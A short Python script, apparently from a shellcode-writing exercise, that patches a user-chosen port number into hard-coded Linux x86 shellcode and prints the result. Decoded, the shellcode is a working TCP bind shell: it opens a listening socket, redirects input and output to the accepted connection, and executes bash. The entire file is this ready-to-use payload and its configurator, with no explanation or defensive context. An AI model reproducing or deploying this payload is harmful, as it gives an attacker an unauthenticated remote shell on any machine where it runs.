#!/bin/python

import sys
import socket
import re

shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x31\\xff\\x50\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc7\\x52\\x52\\x66\\x68ABC\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x10\\x56\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x02\\xcd\\x80\\x31\\xf6\\x56\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x04\\xcd\\x80\\x31\\xf6\\x56\\x56\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x05\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\x31\\xd2\\xcd\\x80"""


if len(sys.argv) < 2:
	print('ArgV1 : port number missing')
	exit(1)


print("----------------------------------------------------------------------------")

p = sys.argv[1]
ph=hex(socket.htons(int(p)))


print('port after htons:'+ph)

byte1 = ph[4:]
byte2 = ph[2:4]

print(byte1,byte2 + ' '+ 'will be pushed on to the shellcode')

print("""choose another port if null byte (\\x0) or (\\x00) is  present""")


print("----------------------------------------------------------------------------")


print('shellcode before :'+str(shellcode))

shellcode1 = re.sub("ABC","\\x"+byte1+"\\x"+byte2,shellcode)
print(' ')

print('shellcode after:'+str(shellcode1))

